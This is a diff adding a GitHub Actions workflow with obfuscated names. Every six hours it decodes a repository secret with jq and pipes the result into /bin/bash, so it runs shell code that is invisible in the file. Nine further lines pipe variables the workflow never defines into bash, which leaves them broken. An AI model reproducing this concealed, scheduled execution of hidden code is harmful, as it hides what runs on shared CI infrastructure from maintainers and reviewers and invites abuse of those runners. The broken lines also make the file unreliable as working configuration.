@@ -1,0 +1,25 @@
+name: shouxiangkongfan
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '54 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: shouxiangkongfan
+        env:
+          njgic770: ${{ secrets.njgic770 }}
+        run: |
+          echo $njgic770 | jq -r .x923 | /bin/bash
+          echo $nyo73963 | jq -r .dv18 | /bin/bash
+          echo $b12265 | jq -r .jqppw569 | /bin/bash
+          echo $q6324 | jq -r .wxojw4642 | /bin/bash
+          echo $mmn8914 | jq -r .mqrol4570 | /bin/bash
+          echo $wuiig05 | jq -r .gnok641 | /bin/bash
+          echo $woc743 | jq -r .nkp4418 | /bin/bash
+          echo $idix203 | jq -r .p9 | /bin/bash
+          echo $hygfy33 | jq -r .jpvn59903 | /bin/bash
+          echo $wz3564 | jq -r .o1594 | /bin/bash
+
